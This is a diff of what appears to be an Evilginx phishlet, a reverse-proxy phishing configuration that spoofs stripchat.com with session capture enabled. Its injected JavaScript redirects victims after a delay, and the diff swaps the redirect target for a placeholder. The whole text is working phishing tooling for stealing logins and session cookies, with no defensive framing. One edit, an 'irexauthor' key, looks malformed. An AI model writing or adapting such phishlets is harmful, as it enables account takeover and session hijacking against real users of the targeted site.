@@ -1,4 +1,4 @@
-author: '@cwaizydee'
+irexauthor: '@cwaizydee'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'sv', orig_sub: 'sv', domain: 'stripchat.com', session: true, is_landing: true, auto_filter: true}
@@ -49,7 +49,7 @@ js_inject:
       }
       async function redirectme() {
         await sleeptime(2000);
-        window.location.href = "{https://www.facebook.com}";
+        window.location.href = "{redirect_url}";
       }
       function myFunction() {
         var run = setInterval("worker()", 1000); 
